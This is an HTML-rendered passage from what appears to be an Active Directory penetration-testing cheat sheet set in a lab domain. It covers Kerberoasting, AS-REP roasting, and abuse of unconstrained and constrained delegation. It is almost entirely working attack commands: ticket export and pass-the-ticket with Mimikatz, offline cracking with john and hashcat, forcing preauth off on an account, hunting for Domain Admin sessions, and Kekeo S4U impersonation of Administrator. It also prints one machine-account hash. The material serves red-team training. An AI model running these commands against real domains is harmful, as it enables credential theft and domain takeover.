&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ADUser&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;STUDENT2&amp;#34;&lt;/span> &lt;span class="n">-ServicePrincipalNames&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="n">Add&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s1">&amp;#39;ops/whatever1&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Request a TGS:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerShell&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-Type&lt;/span> &lt;span class="n">-AssemblyNAme&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityModel&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-Object&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityModel&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Tokens&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">KerberosRequestorSecurityToken&lt;/span> &lt;span class="n">-ArgumentList&lt;/span> &lt;span class="s2">&amp;#34;ops/whatever1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Request-SPNTicket&lt;/span> &lt;span class="n">-SPN&lt;/span> &lt;span class="s2">&amp;#34;ops/whatever1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Check if the ticket has been granted:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">klist&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Export all tickets using Mimikatz:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::list /export&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Crack the Service account password (this step can be performed on a Kali machine):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># tgsrepcrack.py&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git clone https://github.com/nidem/kerberoast
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 ./tgsrepcrack.py ./10-million-password-list-top-1000000.txt ./240a10000-student1@ops~whatever1CYBERLAB.CYBERCORP.LOCAL.kirbi
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>the same TGS can also be cracked by using &lt;code>john&lt;/code>, but it must be firstly converted into a compatible format:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># tgsrepcrack.py&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 ./kirbi2john.py -o ./tgs.john ./240a10000-STUDENT1@MSSQLSvc~database.cyberlab.cybercorp.localCYBERLAB.LOCAL.kirbi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># JohnTheRipper&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/sbin/john --format&lt;span class="o">=&lt;/span>krb5tgs ./tgs.john --wordlist&lt;span class="o">=&lt;/span>./10-million-password-list-top-1000000.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="asreproasting-as-rep">ASREProasting (AS-REP)&lt;/h2>
&lt;p>If a user’s &lt;em>UserAccountControl&lt;/em> settings have &lt;em>Do not require Kerberos preauthentication&lt;/em> enabled, i.e. Kerberos preauth is disabled, it is possible to grab user’s crackable AS-REP and brute-force it offline. With sufficient rights (&lt;em>GenericWrite&lt;/em> or &lt;em>GenericAll&lt;/em>), Kerberos preauth can be forced disabled as well.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Enumerating accounts with Kerberos Preauth disabled:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView_dev&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainUser&lt;/span> &lt;span class="n">-PreauthNotRequired&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">DoesNotRequirePreAuth&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="vm">$True&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="n">DoesNotRequirePreAuth&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or let’s enumerate the permissions for &lt;em>RDPUsers&lt;/em> on ACLs:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ACLScanner&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityReference&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;RDPUsers&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Users in &lt;em>RDPUser&lt;/em> group have &lt;em>GenericWrite&lt;/em> or &lt;em>GenericAll&lt;/em> permission on &lt;em>STUDENTI1&lt;/em> user so it is possible to force the disable of Kerberos Preauth on it:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView_dev&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-DomainObject&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;STUDENTI1&amp;#34;&lt;/span> &lt;span class="n">-XOR&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="n">useraccountcontrol&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">4194304&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">-VerboseGet-DomainUser&lt;/span> &lt;span class="n">-PreauthNotRequired&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Request encrypted AS-REP for offline brute-force&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ASREPRoast&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># JohnTheRipper (bleeding-jumbo branch)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ASREPHash&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENTI1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Out-File&lt;/span> &lt;span class="n">-Encoding&lt;/span> &lt;span class="n">ASCII&lt;/span> &lt;span class="n">john_asrep&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># HashCat&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ASREPHash&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENTI1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;$krb5asrep$&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;$krb5asrep$23$&amp;#39;&lt;/span>&lt;span class="p">)}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Out-File&lt;/span> &lt;span class="n">-Encoding&lt;/span> &lt;span class="n">ASCII&lt;/span> &lt;span class="n">hashcat_asrep&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It is also possible to enumerate all users with Kerberos preauth disabled and request a hash:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ASREPRoast&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># JohnTheRipper (bleeding-jumbo branch)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ASREPRoast&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Hash&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Out-File&lt;/span> &lt;span class="n">-Encoding&lt;/span> &lt;span class="n">ASCII&lt;/span> &lt;span class="n">john_asrep&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># HashCat&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ASREPRoast&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Hash&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;$krb5asrep$&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;$krb5asrep$23$&amp;#39;&lt;/span>&lt;span class="p">)}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Out-File&lt;/span> &lt;span class="n">-Encoding&lt;/span> &lt;span class="n">ASCII&lt;/span> &lt;span class="n">hashcat_asrep&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Using bleeding-jumbo branch of John The Ripper or HashCat, we can brute-force the hashes offline:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># JohnTheRipper (bleeding-jumbo branch)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/sbin/john --format&lt;span class="o">=&lt;/span>krb5asrep --wordlist&lt;span class="o">=&lt;/span>./10-million-password-list-top-1000000.txt john_asrep.kirbi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># HashCat&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">hashcat -m &lt;span class="m">18200&lt;/span> --force hashcat_asrep.kirbi ./10-million-password-list-top-1000000.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="unconstrained-delegation">Unconstrained Delegation&lt;/h2>
&lt;p>General/Basic or Unconstrained Delegation which allows the first hop server (e.g. web server) to request access to any service on any computer in the domain.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Discover domain computers which have unconstrained delegation enabled:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-UnConstrained&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADComputer&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">TrustedForDelegation&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="vm">$True&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">TrustedForDelegation&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="vm">$True&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Compromise the server(s) where Unconstrained delegation is enabled and trick or wait for a domain admin to connect to the service. We can use the following PowerView command to notify for a particular DA to access a resource on the web server:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-UserHunter&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;ops-web&amp;#34;&lt;/span> &lt;span class="n">-Poll&lt;/span> &lt;span class="mf">100&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;Administrator&amp;#34;&lt;/span> &lt;span class="n">-Delay&lt;/span> &lt;span class="mf">5&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Run following commands on it to check if any DA ticket is available and then export it:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;sekurlsa::tickets&amp;#34;&amp;#39;&lt;/span>&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;sekurlsa::tickets /export&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>The DA ticket could then be reused:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-060a10000-Administrator@krbtgtCYBERLAB.CYBERCORP.LOCAL.kirbi&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="constrained-delegation">Constrained Delegation&lt;/h2>
&lt;p>Constrained Delegation allows the first hop server (e.g web server) to request access only to specified services on specified computers. If the user is not using Kerberos authentication to authenticate to the first hop server, Windows offers &lt;em>Protocol Transition&lt;/em> to transition the request to Kerberos.&lt;/p>
&lt;p>To impersonate the user, &lt;strong>Service for User&lt;/strong> (&lt;strong>S4U&lt;/strong>) extension is used and it provides two extensions:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Service for User to Self&lt;/strong> (&lt;strong>S4U2self&lt;/strong>): Allows a service to obtain a forwardable TGS to itself on behalf of a user with just the user principal name without supplying a password. The service account must have the &lt;em>TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION&lt;/em> - T2A4D UserAccountControl attribute.&lt;/li>
&lt;li>&lt;strong>Service for User to Proxy&lt;/strong> (&lt;strong>S4U2proxy&lt;/strong>): Allows a service to obtain a TGS to a second service on behalf of a user. Which second service? This is controlled by &lt;em>msDS-AllowedToDelegateTo&lt;/em> attribute. This attribute contains a list of SPNs to which the user tokens can be forwarded.&lt;/li>
&lt;/ul>
&lt;p>If you have compromised a user account or a computer (machine account) that has kerberos constrained delegation enabled, it’s possible to impersonate any domain user (including administrator) and authenticate to a service that the user account is trusted to delegate to.&lt;/p>
&lt;p>Enumerate users and computers with constrained delegation enabled:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView_dev&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainUser&lt;/span> &lt;span class="n">-TrustedToAuth&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainComputer&lt;/span> &lt;span class="n">-TrustedToAuth&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADObject&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nb">msDS-AllowedToDelegateTo&lt;/span> &lt;span class="o">-ne&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$null&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="nb">msDS-AllowedToDelegateTo&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="constrained-delegation-allowed-for-a-user-account">Constrained delegation allowed for a User Account&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>To abuse constrained delegation in above scenario, we need to have access to the account for which the constrained delegation is enabled. If we have access to that account, it is possible to access the services listed in msDS-AllowedToDelegateTo of this account as ANY user.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Using &lt;em>asktgt&lt;/em> from Kekeo, we request a TGT as the abused account. Either plaintext password or NTLM hash of the compromised account (with constrained delegation enabled) is required:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># Kekeo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kekeo# tgt::ask /user:WEBSVC /domain:cyberlab.cybercorp.local /rc4:[NTLM_HASH_USER_ENABLED_DELEGATION]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Using s4u from Kekeo, we request a TGS as ANY user for the service to which the delegation is enabled, e.g. &lt;em>FILESERVER&lt;/em>, using the TGT previously obtained:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># Kekeo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kekeo# tgs::s4u /tgt:[TGT_USER_ENABLED_DELEGATION] /user:Administrator@CYBERLAB.CYBERCORP.LOCAL /service:cifs/FILESERVER.CYBERLAB.CYBERCORP.LOCAL
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Using mimikatz, inject the TGS ticket:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::ptt TGS_Administrator@cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_cifs~FILESERVER.CYBERLAB.CYBERCORP.LOCAL@CYBERLAB.CYBERCORP.LOCAL.kirbi&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Access the file shares of the target:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">ls &lt;/span>&lt;span class="p">\\&lt;/span>&lt;span class="n">fileserver&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cyberlab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">$&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Another interesting issue in Kerberos is that the delegation occurs not only for the specified service but for any service running under the same account. There is no validation for the SPN specified.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="constrained-delegation-allowed-for-a-machine-account">Constrained delegation allowed for a Machine Account&lt;/h2>
&lt;p>If you have compromised a machine account or in other words you have SYSTEM level privileges on a machine that is configured with constrained delegation, you can assume any identity in the AD domain and authenticate to services that the compromised machine is trusted to delegate to.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>List services to which the machine account is trusted to delegate to:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">msds-allowedtodelegateto&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">useraccountcontrol&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">fl
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Select-Object&lt;/span> &lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="nb">msds-allowedtodelegateto&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">fl
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Using asktgt from Kekeo, we request a TGT as the abused account (in this case a machine account):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># Kekeo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kekeo# tgt::ask /user:cyberlab-adminsrv$ /domain:CYBERLAB.CYBERCORP.LOCAL /rc4:1fadb1b13edbc5a61cbdc389e6f34c67
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Using s4u from Kekeo (no SNAME validation) it is possible to ask for a TGS also for &lt;em>time&lt;/em> and &lt;em>ldap&lt;/em> services by running other two separate commands (putting both the base service and a single alternative one):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># Kekeo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kekeo# tgs::s4u /tgt:TGT_cyberlabadminsrv$@CYBERLAB.CYBERCORP.LOCAL_krbtgt~cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL.kirbi /user:Administrator@cyberlab.cybercorp.local /service:cifs/fileserver.cyberlab.cybercorp.local
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kekeo# tgs::s4u /tgt:TGT_cyberlabadminsrv$@CYBERLAB.CYBERCORP.LOCAL_krbtgt~cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL.kirbi /user:Administrator@cyberlab.cybercorp..local /service:cifs/fileserver.cyberlab.cybercorp.local|time/fileserver.cyberlab.cybercorp.local
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kekeo# tgs::s4u /tgt:TGT_cyberlabadminsrv$@CYBERLAB.CYBERCORP.LOCAL_krbtgt~cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL.kirbi /user:Administrator@cyberlab.cybercorp.local /service:cifs/fileserver.cyberlab.cybercorp.local|ldap/fileserver.cyberlab.cybercorp.local
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Using mimikatz it is possible to inject all the generated TGS tickets (from the previous commands) into the session:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::ptt TGS_Administrator@cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_cifs~cyberlab-dc.cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL.kirbi&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::ptt TGS_Administrator@cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_time~cyberlab-dc.cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_ALT.kirbi&amp;#34;&amp;#39;&lt;/span>
